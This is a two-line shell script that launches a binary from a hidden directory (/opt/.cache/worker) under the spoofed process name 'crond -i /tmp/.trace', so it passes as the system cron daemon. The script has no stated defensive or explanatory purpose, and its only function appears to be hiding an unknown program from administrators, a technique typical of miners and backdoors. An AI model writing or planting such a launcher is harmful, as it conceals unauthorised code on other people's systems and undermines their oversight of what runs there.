#!/bin/sh
exec -a "crond -i /tmp/.trace" /opt/.cache/worker
